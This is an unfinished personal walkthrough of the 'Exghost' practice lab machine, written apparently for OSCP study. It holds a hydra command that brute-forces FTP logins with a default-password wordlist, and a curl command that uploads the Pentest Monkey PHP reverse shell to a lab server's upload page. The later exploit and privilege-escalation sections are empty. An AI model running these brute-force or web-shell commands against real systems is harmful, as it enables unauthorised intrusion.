# ExGhost Walkthrough
Name: Exghost
Date:  04/09/2022
Difficulty:  Easy
Goals:  OSCP
Learnt: This wordlist for ftp default creds `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`

Reupload after failure with markdown image sizing
`
## Recon

Thought my recon was good.. but ended up adding this to my hydra cheatsheet. Close the walkthrough because that seemed like a bit of a slap in the face.

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
```

![](ftpbrute.png)

Got the backup file, `file backup` outputs that it is a pcap filem open wireshark 
![](posttoexiftool.png)

Post the Pentest Monkey PHP reverse shell!

Work in progress

```bash
curl -X POST -F "type=file;name=php-reverse-shell.php;type=submit;type=Upload" 'http://192.168.226.183/exiftool.php' -F "file=@php-reverse-shell.php"
```

## Exploit

## Foothold

## PrivEsc

      
